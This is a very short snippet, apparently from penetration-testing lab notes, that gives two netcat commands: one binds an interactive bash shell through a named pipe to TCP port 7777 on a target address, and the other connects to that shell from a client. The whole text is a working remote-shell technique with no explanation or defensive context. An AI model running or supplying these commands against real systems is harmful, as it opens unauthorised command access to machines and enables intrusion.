**Server - Binding a Bash Shell to the TCP Session:**

```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**Client - Connecting to Bind Shell  on Target:**

```sh
nc -nv 10.129.41.200 7777
```

